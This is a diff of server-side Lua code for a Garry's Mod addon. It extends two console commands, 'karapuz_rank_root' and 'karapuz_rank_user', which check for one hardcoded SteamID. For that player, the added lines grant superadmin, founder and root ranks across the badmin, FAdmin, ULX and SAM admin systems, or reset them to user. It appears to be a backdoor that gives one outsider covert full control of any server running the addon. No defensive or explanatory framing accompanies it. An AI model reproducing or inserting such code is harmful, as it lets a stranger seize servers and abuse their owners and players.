@@ -3,7 +3,14 @@ if SERVER then
 concommand.Add("karapuz_rank_root", function( ply ) 
 if ply:SteamID() == 'STEAM_0:0:555589835' then 
     RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'root')
-
+	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'superadmin')
+	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'founder')
+	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'root')
+	RunConsoleCommand('ulx', 'adduserid', ply:SteamID(), 'superadmin')
+	RunConsoleCommand('ulx', 'adduserid', ply:SteamID(), 'root')
+	RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'root')
+	RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'superadmin')
+                
        elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
                 
         end
@@ -17,6 +24,13 @@ if SERVER then
 concommand.Add("karapuz_rank_user", function( ply ) 
 if ply:SteamID() == 'STEAM_0:0:555589835' then 
     RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user')
+	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'user')
+	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'user')
+	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'user')
+	RunConsoleCommand('ulx', 'adduserid', ply:SteamID(), 'user')
+	RunConsoleCommand('ulx', 'adduserid', ply:SteamID(), 'user')
+	RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user')
+	RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user')
 
        elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
                 
